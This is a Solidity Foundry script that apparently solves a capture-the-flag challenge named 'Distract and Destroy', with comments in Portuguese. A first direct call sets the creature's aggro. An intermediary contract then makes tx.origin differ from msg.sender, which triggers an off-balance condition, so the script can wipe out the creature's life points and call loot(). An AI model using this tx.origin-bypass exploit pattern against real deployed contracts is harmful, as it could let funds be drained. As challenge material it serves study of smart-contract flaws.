// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/blockchain_distract_and_destroy/Creature.sol";
import "../src/blockchain_distract_and_destroy/Setup.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract exploitContract {
  Creature level;
  constructor(Creature level_) {
    level = level_;
  } 

  function attack(uint256 _damage) public {
    level.attack(_damage);
  } 
} 


contract DistractAndDestroySolution is Script {
  Creature public level = Creature(payable(0xd59796643426bF121195Ee5d884848E2149987d4));
  Setup public level_setup = Setup(payable(0xbA515a1517AB96C0fCdF8b658dc08e5Cd9028805));

  function run() external { 
    vm.startBroadcast(vm.envUint("PRIVATE_KEY_DISTRACT_AND_DESTROY"));
    console.log("Level Solved?", level_setup.isSolved());
    level.attack(10); //vai cair no segundo else, mas aggro = myAddress
    console.log("Aggro address: ", vm.toString(level.aggro()));
    exploitContract exploit = new exploitContract(level);
    exploit.attack(1000); // _isOffBalance() será true, já que aggro = myWalletAddress e tx.origin != msg.sender pq quem está chamando é um contrato
    console.log("Life Points: ", level.lifePoints());
    level.loot();
    console.log("Level Solved?", level_setup.isSolved());
    vm.stopBroadcast();

  }
} 
